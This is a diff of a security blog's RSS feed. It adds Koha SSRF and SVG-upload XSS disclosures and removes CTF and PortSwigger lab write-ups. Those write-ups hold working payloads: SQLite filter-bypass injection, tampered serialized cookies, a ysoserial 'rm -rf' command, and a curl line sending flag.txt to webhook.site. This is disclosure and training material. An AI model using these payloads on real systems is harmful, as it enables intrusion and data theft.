@@ -3,13 +3,111 @@
         <title>All Posts - g03m0n</title>
         <link>https://g03m0n.github.io/posts/</link>
         <description>All Posts | g03m0n</description>
-        <generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Wed, 31 Dec 2025 08:29:01 &#43;0800</lastBuildDate><atom:link href="https://g03m0n.github.io/posts/" rel="self" type="application/rss+xml" /><item>
-    <title>Stored XSS in Koha version ≤25.11 (CVE-2026-26378)</title>
+        <generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Wed, 31 Dec 2025 08:31:01 &#43;0800</lastBuildDate><atom:link href="https://g03m0n.github.io/posts/" rel="self" type="application/rss+xml" /><item>
+    <title>SSRF in Koha version ≤ 25.11 (CVE-2026-26379)</title>
+    <link>https://g03m0n.github.io/posts/cve-2026-26379/</link>
+    <pubDate>Wed, 31 Dec 2025 08:31:01 &#43;0800</pubDate>
+    <author>g03m0n</author>
+    <guid>https://g03m0n.github.io/posts/cve-2026-26379/</guid>
+    <description><![CDATA[<h1 id="ssrf-in-koha-version--2511-cve-2026-26379">SSRF in Koha version ≤ 25.11 (CVE-2026-26379)</h1>
+<h2 id="description-and-impact">Description and Impact</h2>
+<table>
+<thead>
+<tr>
+<th><strong>Type</strong></th>
+<th><strong>Affected Version</strong></th>
+<th><strong>?-day</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>SSRF</td>
+<td>≤25.11 (latest)</td>
+<td>0-day</td>
+</tr>
+</tbody>
+</table>
+<p>Impact:</p>
+<ul>
+<li><strong>Internal Port Scanning:</strong> Attackers can map the internal network and identify running services by analyzing the server&rsquo;s response time (time-based blind SSRF).</li>
+<li><strong>Denial of Service (DoS):</strong> Setting the timeout to 0 or targeting critical internal services (like the database port) can exhaust server resources.</li>
+<li><strong>Cloud Metadata Exposure:</strong> If hosted on a cloud provider (AWS, GCP, Azure), this could allow access to the instance metadata service (e.g., <code>169.254.169.254</code>) to steal temporary credentials.</li>
+</ul>
+<h2 id="steps-to-reproduce">Steps to Reproduce</h2>
+<p>First, from the Dashboard interface, go to <strong>Koha Administration</strong> → <strong>Z39.50/SRU servers:</strong></p>
+<p></p>
+<p>Select <strong><code>+ New Z39.50 server</code></strong></p>
+<p></p>
+<p>Assume the internal network is hosting an application on port 8888: <code>nc -nvlp 8888</code></p>
+<p></p>
+<p>Fill in the information as follows:</p>
+<p></p>
+<p>Save.</p>
+<p>Go to <a href="http://192.168.116.130:8080/cgi-bin/koha/cataloguing/z3950_search.pl" target="_blank" rel="noopener noreffer">http://192.168.116.130:8080/cgi-bin/koha/cataloguing/z3950_search.pl</a>
+ and fill in the information as shown in the image:</p>
+<p></p>
+<p>Click Search.</p>
+<p>A request is sent to the server:</p>
+<p></p>
+<ul>
+<li>If the response is <code>Connection timeout</code>, it means there is an internal service with port 8888 open:</li>
+</ul>
+<p></p>
+<ul>
+<li>If there is no service listening on port 8888, the response is <code>Connection failed</code>:</li>
+</ul>
+<p></p>
+]]></description>
+</item>
+<item>
+    <title>Cross-Site Scripting via File Upload in Koha (CVE-2026-26378)</title>
     <link>https://g03m0n.github.io/posts/cve-2026-26378/</link>
-    <pubDate>Wed, 31 Dec 2025 08:29:01 &#43;0800</pubDate>
+    <pubDate>Wed, 31 Dec 2025 08:30:01 &#43;0800</pubDate>
     <author>g03m0n</author>
     <guid>https://g03m0n.github.io/posts/cve-2026-26378/</guid>
-    <description><![CDATA[<h1 id="stored-xss-in-koha-version-2511-cve-2026-26378">Stored XSS in Koha version ≤25.11 (CVE-2026-26378)</h1>
+    <description><![CDATA[<h1 id="cross-site-scripting-via-file-upload-in-koha-cve-2026-26378">Cross-Site Scripting via File Upload in Koha (CVE-2026-26378)</h1>
+<h2 id="description-and-impact">Description and Impact</h2>
+<table>
+<thead>
+<tr>
+<th>Type</th>
+<th>Version Affected</th>
+<th>?-day</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>XSS via File Upload</td>
+<td>≤ 25.11 (latest)</td>
+<td>0-day</td>
+</tr>
+</tbody>
+</table>
+<h2 id="steps-to-reproduce">Steps to Reproduce</h2>
+<p>First, create an arbitrary vendor (if one already exists, skip this step):</p>
+<p></p>
+<p>Vendor <code>ABC</code> was successfully created.
+Access <strong><code>Receive Shipments</code></strong> to create a new Invoice:</p>
+<p></p>
+<p></p>
+<p>Successfully created an Invoice with <code>invoiceid=3</code> :</p>
+<p></p>
+<p>Then, access the URL: <code>cgi-bin/koha/acqui/invoice-files.pl?invoiceid=3</code> :</p>
+<p></p>
+<p>Proceed to upload an SVG file containing the XSS payload as follows:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bnf" data-lang="bnf"><span style="display:flex;"><span>&lt;<span style="color:#a6e22e">svg xmlns=&#34;http://www.w3.org/2000/svg&#34; onload=&#34;alert(document.domain)&#34;</span>&gt;&lt;<span style="color:#a6e22e">/svg</span>&gt;
+</span></span></code></pre></div><p></p>
+<p>Since the application allows <code>inline</code> rendering for files with an <code>image</code> Content-Type, it is possible to upload an SVG file containing an XSS payload. Clicking to view the file will cause the JavaScript to execute in the browser → <strong>Triggering XSS</strong>.</p>
+<p></p>
+]]></description>
+</item>
+<item>
+    <title>Stored XSS in Koha version ≤25.11 (CVE-2026-26377)</title>
+    <link>https://g03m0n.github.io/posts/cve-2026-26377/</link>
+    <pubDate>Wed, 31 Dec 2025 08:29:01 &#43;0800</pubDate>
+    <author>g03m0n</author>
+    <guid>https://g03m0n.github.io/posts/cve-2026-26377/</guid>
+    <description><![CDATA[<h1 id="stored-xss-in-koha-version-2511-cve-2026-26377">Stored XSS in Koha version ≤25.11 (CVE-2026-26377)</h1>
 <h2 id="description-and-impact">Description and Impact</h2>
 <table>
 <thead>
@@ -843,382 +941,6 @@ Thay vì <code>inject</code> một câu lệnh để server thực hiện sau kh
 <code>http://18.142.90.137:31315/ -F file=@/flag.txt https://webhook.site/407cb1c3-4316-4cb8-8b9c-4ece7abf8d11</code></p>
 <p></p>
 <p>Tải file <code>flag.txt</code> về ta được flag: <code>CHH{b48Y_CUrl_CrAwl3r_1c7ddee4c53dfc5fc952c63ca0aebb9a}</code></p>
-]]></description>
-</item>
-<item>
-    <title>CookieCTF - Baby SQLite With Filter</title>
-    <link>https://g03m0n.github.io/posts/cookiectf---baby-sqlite-with-filter/cookiectf-babysqlitewithfilter/</link>
-    <pubDate>Fri, 19 Jan 2024 21:29:01 &#43;0800</pubDate>
-    <author>g03m0n</author>
-    <guid>https://g03m0n.github.io/posts/cookiectf---baby-sqlite-with-filter/cookiectf-babysqlitewithfilter/</guid>
-    <description><![CDATA[<h2 id="description">Description</h2>
-<p>Link challenge tại <a href="https://battle.cookiearena.org/challenges/web/baby-sqlite-with-filter" target="_blank" rel="noopener noreffer">đây</a>
-</p>
-<blockquote>
-<p>You cannot create the query because we have blocked the following keywords. Challenge you to bypass it, how to know after each SQL Keyword you will be used what SQL statement. The blacklist sqli_filter = &lsquo;[&rsquo;, &lsquo;]&rsquo;, &lsquo;,&rsquo;, &lsquo;admin&rsquo;, &lsquo;select&rsquo;, &lsquo;&rsquo;&rsquo;, &lsquo;&quot;&rsquo;, &lsquo;\t&rsquo;, &lsquo;\n&rsquo;, &lsquo;\r&rsquo;, &lsquo;\x08&rsquo;, &lsquo;\x09&rsquo;, &lsquo;\x00&rsquo;, &lsquo;\x0b&rsquo;, &lsquo;\x0d&rsquo;, &rsquo; &lsquo;.
-<strong>The vulnerable parameter is &rsquo;level&rsquo; in Login function.</strong></p>
-</blockquote>
-<h2 id="step">Step</h2>
-<p>Đây là giao diện chính của challenge:</p>
-<p></p>
-<p>Tiến hành đọc source code:</p>
-<pre tabindex="0"><code>#!/usr/bin/env python3
-from flask import Flask, request, render_template, make_response, redirect, url_for, session, g
-import urllib
-import os
-import sqlite3
-
-app = Flask(__name__)
-app.secret_key = os.urandom(32)
-from flask import _app_ctx_stack
-
-DATABASE = &#39;users.db&#39;
-
-def get_db():
-    top = _app_ctx_stack.top
-    if not hasattr(top, &#39;sqlite_db&#39;):
-        top.sqlite_db = sqlite3.connect(DATABASE)
-    return top.sqlite_db
-
-
-FLAG = open(&#39;/flag.txt&#39;, &#39;r&#39;).read()
-
-
-@app.route(&#39;/&#39;)
-def index():
-    return render_template(&#39;index.jinja2&#39;)
-
-
-@app.route(&#39;/login&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;])
-def login():
-    if request.method == &#39;GET&#39;:
-        return render_template(&#39;login.jinja2&#39;)
-
-    uid = request.form.get(&#39;uid&#39;, &#39;&#39;).lower()
-    upw = request.form.get(&#39;upw&#39;, &#39;&#39;).lower()
-    level = request.form.get(&#39;level&#39;, &#39;9&#39;).lower()
-
-    sqli_filter = [&#39;[&#39;, &#39;]&#39;, &#39;,&#39;, &#39;admin&#39;, &#39;select&#39;, &#39;\&#39;&#39;, &#39;&#34;&#39;, &#39;\t&#39;, &#39;\n&#39;, &#39;\r&#39;, &#39;\x08&#39;, &#39;\x09&#39;, &#39;\x00&#39;, &#39;\x0b&#39;, &#39;\x0d&#39;, &#39; &#39;]
-    for x in sqli_filter:
-        if uid.find(x) != -1:
-            return &#39;No Hack!&#39;
-        if upw.find(x) != -1:
-            return &#39;No Hack!&#39;
-        if level.find(x) != -1:
-            return &#39;No Hack!&#39;
-
-   
-    with app.app_context():
-        conn = get_db()
-        query = f&#34;SELECT uid FROM users WHERE uid=&#39;{uid}&#39; and upw=&#39;{upw}&#39; and level={level};&#34;
-        try:
-            req = conn.execute(query)
-            result = req.fetchone()
-
-            if result is not None:
-                uid = result[0]
-                if uid == &#39;admin&#39;:
-                    return FLAG
-        except Exception as e:
-            print(e)
-            return &#39;Error!&#39;
-    return &#39;Good!&#39;
-
-
-@app.teardown_appcontext
-def close_connection(exception):
-    top = _app_ctx_stack.top
-    if hasattr(top, &#39;sqlite_db&#39;):
-        top.sqlite_db.close()
-
-
-if __name__ == &#39;__main__&#39;:
-    os.system(&#39;rm -rf %s&#39; % DATABASE)
-    with app.app_context():
-        conn = get_db()
-        conn.execute(&#39;CREATE TABLE users (uid text, upw text, level integer);&#39;)
-        conn.execute(&#34;INSERT INTO users VALUES (&#39;dream&#39;,&#39;cometrue&#39;, 9);&#34;)
-        conn.commit()
-
-    app.run(host=&#39;0.0.0.0&#39;, port=1337)
-</code></pre><p>Có thể thấy được rằng để lấy được flag thì <code>uid</code> phải là <code>admin</code> nhưng ở trong database lại không có user nào là <code>admin</code>.
-Vì vậy ta phải khiến cho chương trình hiện thị ra mỗi một cái bảng với cột uid = <code>admin</code>.</p>
-<p>Thử nghiệm ở trên <a href="https://sqliteonline.com/" target="_blank" rel="noopener noreffer">SQLite Online</a>
- với câu lệnh như sau:</p>
-<pre tabindex="0"><code>SELECT uid FROM users WHERE uid=&#39;dream&#39; AND upw= &#39;cometrue&#39; AND level=&#39;9&#39; UNION SELECT &#39;admin&#39; AS uid;
-</code></pre><p></p>
-<p>Nhưng ta đã bị filter khá là nhiều ký tự, trong đó có cả <code>SELECT</code> và <code>admin</code>.</p>
-<p>Trong SQLite, theo <a href="http://www.humane-assessment.com/blog/moose-custom-analyses-made-easy/#:~:text=For%20example%2C%20to%20build%20a%20parser%20for%20SQLite%2C%20you%20can%20follow%20the%20official%20abstract%20grammar.%20In%20this%20grammar%2C%20the%20selectCore%20is%20one%20of%20the%20central%20productions%20and%20the%20specification%20looks%20like%3A" target="_blank" rel="noopener noreffer">selectCore</a>
- ngoài kết hợp toán tử <code>UNION</code> với toán tử <code>SELECT</code> ta còn có thể kết hợp với toán tử <code>VALUES</code>.</p>
-<p></p>
-<p>Thử nghiệm:</p>
-<pre tabindex="0"><code>SELECT uid FROM users WHERE uid=&#39;dream&#39; AND upw=&#39;&#39; AND level=0 UNION VALUES(&#39;admin&#39;);
-</code></pre><p></p>
-<p>Và bypass ký tự <code>admin</code> bằng hàm <code>char()</code> có sẵn trong SQLite để ép kiểu về dạng ASCII, dùng <code>||</code> để nối chuỗi và dùng <code>/**/</code> để bypass khoảng trắng.
-Payload:</p>
-<pre tabindex="0"><code>uid=&amp;upw=&amp;level=0/**/union/**/values(char(97)||char(100)||char(109)||char(105)||char(110))
-</code></pre><p>Flag: <code>CHH{uS1nG_5yN7@x_d149raM_f95a6d70e2d13245852f2bc2a9ec023a}</code></p>
-]]></description>
-</item>
-<item>
-    <title>PortSwigger - Insecure Deserialization</title>
-    <link>https://g03m0n.github.io/posts/portswigger---insecure-deserialization/portswigger-insecure-deserialization/</link>
-    <pubDate>Wed, 20 Dec 2023 08:29:01 &#43;0800</pubDate>
-    <author>g03m0n</author>
-    <guid>https://g03m0n.github.io/posts/portswigger---insecure-deserialization/portswigger-insecure-deserialization/</guid>
-    <description><![CDATA[<blockquote>
-<p>Thông thường cấu trúc của <code>Serialize Data</code> có dạng:
-<code>O: strlen(object name): object name: object size: {... elements...}</code></p>
-</blockquote>
-<h2 id="1--modifying-serialized-objects">1.  Modifying serialized objects</h2>
-<h3 id="description">Description</h3>
-<blockquote>
-<p>This lab uses a serialization-based session mechanism and is vulnerable to privilege escalation as a result. To solve the lab, edit the serialized object in the session cookie to exploit this vulnerability and gain administrative privileges. Then, delete Carlos&rsquo;s account.
-You can log in to your own account using the5 following credentials: wiener:peter</p>
-</blockquote>
-<h3 id="exploitaion">Exploitaion</h3>
-<p>Challenge này yêu cầu ta thay đổi thuộc tính trên serialized objects để leo quyền lên admin.</p>
-<p>Đăng nhập bằng tài khoản <code>wiener:peter</code>.</p>
-<p></p>
-<p>Ta thấy <code>session cookie</code> là một object <code>User</code> sau khi được serialized và base64-encode. Để ý object <code>User</code> này có thuộc tính <code>admin</code> hiện có giá trị boolean <code>0</code> tức là <code>false</code>.</p>
-<p></p>
-<p>Vì user này không phải <code>admin</code> → không vào được trang <code>/admin</code>.
-=&gt; Ta thử thay đổi giá trị boolean ở serialized session cookie thành <code>1</code></p>
-<p></p>
-<p>End-code base64</p>
-<p></p>
-<p>Edit cookie của trang web và load lại trang:</p>
-<p></p>
-<p>=&gt; <code>User</code> đã đăng nhập được vào trang <code>/admin</code>
-Tiến hành xóa user <code>Carlos</code>.</p>
-<p></p>
-<p>Solved</p>
-<p></p>
-<h2 id="2-modifying-serialized-data-types">2. Modifying serialized data types</h2>
-<h3 id="description-1">Description</h3>
-<blockquote>
-<p>This lab uses a serialization-based session mechanism and is vulnerable to authentication bypass as a result. To solve the lab, edit the serialized object in the session cookie to access the administrator account. Then, delete Carlos.
-You can log in to your own account using the following credentials: wiener:peter</p>
-</blockquote>
-<h3 id="exploitaion-1">Exploitaion</h3>
-<p>Tương tự lab 1, session cookie cũng được serialize từ <code>User</code> object</p>
-<p></p>
-<p>Lần này ứng dụng authenticate user thông qua thuộc tính access_token là chuỗi kí tự dài 32 kí tự.</p>
-<pre tabindex="0"><code>O: 4: &#34;User&#34;: 2: {s: 8: &#34;username&#34;; s: 6: &#34;wiener&#34;; s: 12: &#34;access_token&#34;;s: 32: &#34;t2blplwd06k5lr3coyxnjzy7ne355ge5&#34;;}
-</code></pre><p>Tuy nhiên, theo mô tả có thể ứng dụng này sử dụng PHP loose comparison bởi operator <code>==</code> để authenticate như sau:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>$user <span style="color:#f92672">=</span> <span style="color:#a6e22e">unserialize</span>($_SESSION)
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ($user[<span style="color:#e6db74">&#39;access_token&#39;</span>] <span style="color:#f92672">==</span> $access_token) {
-</span></span><span style="display:flex;"><span><span style="color:#75715e">// Authenticate successfully
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>}
-</span></span></code></pre></div><p>Như vậy ta sẽ bypass bằng cách chỉnh <code>access_token</code> về số nguyên 0 → bypass được <code>==</code> vì 0 <code>==</code> <code>string</code> sẽ trả về <code>true</code>. Serialized object sau khi chỉnh như sau:</p>
-<pre tabindex="0"><code>O: 4: &#34;User&#34;: 2: {s: 8: &#34;username&#34;; s: 6: &#34;wiener&#34;; s: 12: &#34;access_token&#34;;i: 0;}
-</code></pre><p>Endcode base64 và edit cookie</p>
-<p></p>
-<p>Đăng nhập vào <code>admin</code> panel thành công và tiến hành xóa user <code>Carlos</code>.</p>
-<p></p>
-<p>Solved</p>
-<p></p>
-<h2 id="3-using-application-functionality-to-exploit-insecure-deserialization">3. Using application functionality to exploit insecure deserialization</h2>
-<h3 id="description-2">Description</h3>
-<blockquote>
-<p>This lab uses a serialization-based session mechanism. A certain feature invokes a dangerous method on data provided in a serialized object. To solve the lab, edit the serialized object in the session cookie and use it to delete the morale.txt file from Carlos&rsquo;s home directory.
-You can log in to your own account using the following credentials: wiener:peter
-You also have access to a backup account: gregg:rosebud</p>
-</blockquote>
-<h3 id="exploitaion-2">Exploitaion</h3>
-<p>Tương tự 2 labs trên, Session Cookie cũng được serialize từ <code>User</code> object</p>
-<p></p>
-<p>Lần này ứng dụng có thêm thuộc tính <code>avatar_link</code>. Mà ứng dụng này có chức năng <code>Delete account</code> =&gt; Khi ấn vào nút <code>Delete account</code> thì ứng dụng sẽ xóa cả <code>avatar</code> của người dùng.</p>
-<p>Nếu ta thay đổi đường dẫn tại thuộc tính <code>avatar_link</code> thành 1 file bất kì trong hệ thống thì file đó sẽ bị delete khỏi hệ thống khi <code>Delete account</code>.</p>
-<p>Chỉnh sửa <code>avatar_link</code> thành <code>/home/carlos/morale.txt</code> để tiến hành xóa file.</p>
-<pre tabindex="0"><code>O:4:&#34;User&#34;:3:{s:8:&#34;username&#34;;s:6:&#34;wiener&#34;;s:12:&#34;access_token&#34;;s:32:&#34;bqp5e5wpdhhaz3rt0knb1u6uowozl5se&#34;;s:11:&#34;avatar_link&#34;;s:23:&#34;/home/carlos/morale.txt&#34;;}
-</code></pre><p>Endcode base64 và Edit cookie.</p>
-<p></p>
-<p></p>
-<p>Load lại trang và Solved.</p>
-<p></p>
-<h2 id="4-arbitrary-object-injection-in-php">4. Arbitrary object injection in PHP</h2>
-<h3 id="description-3">Description</h3>
-<blockquote>
-<p>This lab uses a serialization-based session mechanism and is vulnerable to arbitrary object injection as a result. To solve the lab, create and inject a malicious serialized object to delete the morale.txt file from Carlos&rsquo;s home directory. You will need to obtain source code access to solve this lab.
-You can log in to your own account using the following credentials: wiener:peter</p>
-</blockquote>
-<h3 id="exploitaion-3">Exploitaion</h3>
-<p>Tương tự 3 labs trên, Session Cookie cũng được serialize từ <code>User</code> object</p>
-<p>Khi ấn vào <code>view-source</code> ta thấy một đường dẫn:</p>
-<p></p>
-<p>Kiểm tra thử đường dẫn xem có đọc được source code không:</p>
-<p></p>
-<p>Không có gì phản hồi. Ta thử thêm dấu <code>~</code> vào cuối đường dẫn, ta xem được mã nguồn file <code>/libs/CustomTemplate.php</code>.</p>
-<p>Mã nguồn file <code>/libs/CustomTemplate.php</code>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">CustomTemplate</span> {
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> $template_file_path;
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> $lock_file_path;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __construct($template_file_path) {
-</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">template_file_path</span> <span style="color:#f92672">=</span> $template_file_path;
-</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">lock_file_path</span> <span style="color:#f92672">=</span> $template_file_path <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34;.lock&#34;</span>;
-</span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">isTemplateLocked</span>() {
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">file_exists</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">lock_file_path</span>);
-</span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">getTemplate</span>() {
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">file_get_contents</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">template_file_path</span>);
-</span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">saveTemplate</span>($template) {
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">isTemplateLocked</span>()) {
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">file_put_contents</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">lock_file_path</span>, <span style="color:#e6db74">&#34;&#34;</span>) <span style="color:#f92672">===</span> <span style="color:#66d9ef">false</span>) {
-</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Exception</span>(<span style="color:#e6db74">&#34;Could not write to &#34;</span> <span style="color:#f92672">.</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">lock_file_path</span>);
-</span></span><span style="display:flex;"><span>            }
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">file_put_contents</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">template_file_path</span>, $template) <span style="color:#f92672">===</span> <span style="color:#66d9ef">false</span>) {
-</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Exception</span>(<span style="color:#e6db74">&#34;Could not write to &#34;</span> <span style="color:#f92672">.</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">template_file_path</span>);                    
-</span></span><span style="display:flex;"><span>            }
-</span></span><span style="display:flex;"><span>        }
-</span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">function</span> __destruct() {
-</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// Carlos thought this would be a good idea
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">file_exists</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">lock_file_path</span>)) {
-</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">unlink</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">lock_file_path</span>);
-</span></span><span style="display:flex;"><span>        }
-</span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>}
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
-</span></span></span></code></pre></div><p>Một class <code>CustomTemplate</code> được định nghĩa với 2 thuộc tính <code>template_file_path</code> và <code>lock_file_path</code>. Ta chỉ cần quan tâm <a href="https://www.php.net/manual/en/language.oop5.magic.php" target="_blank" rel="noopener noreffer">magic method</a>
- <code>__destruct()</code> khi nó thực hiện xóa file tại <code>lock_file_path</code>, nếu nó tồn tại. Mặt khác <code>__destruct()</code> sẽ được gọi khi server thực hiện deserialize.</p>
-<p>=&gt; Ta có thể tận dụng session cookie để thực hiện Object Injection như sau:</p>
-<pre tabindex="0"><code>O: 14: &#34;CustomTemplate&#34;: 1: {s: 14: &#34;lock_file_path&#34;; s: 23: &#34;/home/carlos/morale.txt&#34;;}
-</code></pre><p>Endcode base64 và edit cookie:</p>
-<p></p>
-<p></p>
-<p>Solved</p>
-<p></p>
-<h2 id="5-exploiting-java-deserialization-with-apache-commons">5. Exploiting Java deserialization with Apache Commons</h2>
-<h3 id="description-4">Description</h3>
-<blockquote>
-<p>This lab uses a serialization-based session mechanism and loads the Apache Commons Collections library. Although you don&rsquo;t have source code access, you can still exploit this lab using pre-built gadget chains.
-To solve the lab, use a third-party tool to generate a malicious serialized object containing a remote code execution payload. Then, pass this object into the website to delete the morale.txt file from Carlos&rsquo;s home directory.
-You can log in to your own account using the following credentials: wiener:peter</p>
-</blockquote>
-<h3 id="exploitation">Exploitation</h3>
-<p>Cookie của ứng dụng là một Java serialize Object</p>
-<p></p>
-<p>Ở lab này, ta sẽ tạo <code>gadget chain</code> bằng ứng dụng có tên là <a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noopener noreffer">ysoserial</a>
- để khai thác.</p>
-<p>Đầu tiên, vì ứng dụng sử dụng thư viện <code>Apache Commons Collections</code> nên ta sẽ sử dụng <code>gadget chain</code> có tên là <code>CommonsCollections1</code>,&hellip;, <code>CommonsCollections4</code> để sinh ra payload. Sau vài lần thử, ta có thể dụng được gadget<code>CommonsCollections4</code>.</p>
-<p>Payload:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>java <span style="color:#960050;background-color:#1e0010">\</span>
-</span></span><span style="display:flex;"><span> <span style="color:#f92672">--</span>add<span style="color:#f92672">-</span>opens<span style="color:#f92672">=</span>java.<span style="color:#a6e22e">xml</span><span style="color:#f92672">/</span>com.<span style="color:#a6e22e">sun</span>.<span style="color:#a6e22e">org</span>.<span style="color:#a6e22e">apache</span>.<span style="color:#a6e22e">xalan</span>.<span style="color:#a6e22e">internal</span>.<span style="color:#a6e22e">xsltc</span>.<span style="color:#a6e22e">trax</span><span style="color:#f92672">=</span>ALL<span style="color:#f92672">-</span>UNNAMED<span style="color:#960050;background-color:#1e0010">\</span>
-</span></span><span style="display:flex;"><span> <span style="color:#f92672">--</span>add<span style="color:#f92672">-</span>opens<span style="color:#f92672">=</span>java.<span style="color:#a6e22e">xml</span><span style="color:#f92672">/</span>com.<span style="color:#a6e22e">sun</span>.<span style="color:#a6e22e">org</span>.<span style="color:#a6e22e">apache</span>.<span style="color:#a6e22e">xalan</span>.<span style="color:#a6e22e">internal</span>.<span style="color:#a6e22e">xsltc</span>.<span style="color:#a6e22e">runtime</span><span style="color:#f92672">=</span>ALL<span style="color:#f92672">-</span>UNNAMED<span style="color:#960050;background-color:#1e0010">\</span>
-</span></span><span style="display:flex;"><span> <span style="color:#f92672">--</span>add<span style="color:#f92672">-</span>opens<span style="color:#f92672">=</span>java.<span style="color:#a6e22e">base</span><span style="color:#f92672">/</span>sun.<span style="color:#a6e22e">reflect</span>.<span style="color:#a6e22e">annotation</span><span style="color:#f92672">=</span>ALL<span style="color:#f92672">-</span>UNNAMED<span style="color:#960050;background-color:#1e0010">\</span>
-</span></span><span style="display:flex;"><span> <span style="color:#f92672">-</span>jar .<span style="color:#f92672">/</span>ysoserial<span style="color:#f92672">-</span>all.<span style="color:#a6e22e">jar</span> CommonsCollections4 <span style="color:#e6db74">&#34;rm -rf /home/carlos/morale.txt&#34;</span> 2<span style="color:#f92672">&gt;</span> nul <span style="color:#f92672">|</span> base64 <span style="color:#f92672">-</span>w0 
-</span></span></code></pre></div><p></p>
-<p>Sử dụng payload vừa tạo và send request</p>
-<p></p>
-<p>Ứng dụng có mã lỗi 500 nhưng ta vẫn solve được challange.</p>
-<p></p>
-<h2 id="6-exploiting-php-deserialization-with-a-pre-built-gadget-chain">6. Exploiting PHP deserialization with a pre-built gadget chain</h2>
-<h3 id="description-5">Description</h3>
-<blockquote>
-<p>This lab has a serialization-based session mechanism that uses a signed cookie. It also uses a common PHP framework. Although you don&rsquo;t have source code access, you can still exploit this lab&rsquo;s insecure deserialization using pre-built gadget chains.
-To solve the lab, identify the target framework then use a third-party tool to generate a malicious serialized object containing a remote code execution payload. Then, work out how to generate a valid signed cookie containing your malicious object. Finally, pass this into the website to delete the morale.txt file from Carlos&rsquo;s home directory.
-You can log in to your own account using the following credentials: <code>wiener:peter</code></p>
-</blockquote>
-<h3 id="exploitation-1">Exploitation</h3>
-<p>Bài này tương tự bài trên nhưng sử dụng ngôn ngữ PHP. Tool ta sẽ sử dụng cho bài này có tên là <a href="https://github.com/ambionics/phpggc" target="_blank" rel="noopener noreffer">PHPGCC</a>
-</p>
-<p>Cookie là một <code>PHP serialize Object</code>. Trong đó, trường <code>sig_hmac_sha1</code> chính là <code>signature</code> để verify User object tại trường <code>token</code> có bị thay đổi hay không.</p>
-<p></p>
-<p>Khi ta nhập session sai và gửi request, server trả về thông báo lỗi <code>signature</code> sai và thư viện sử dụng:</p>
-<p></p>
-<p>Ở đây ứng dụng sử dụng thư viện <code>Symphony</code> version <code>4.3.6</code>
-Tiến hành tạo payload bằng <code>PHPGGC</code> tool.</p>
-<p></p>
-<p>Payload:</p>
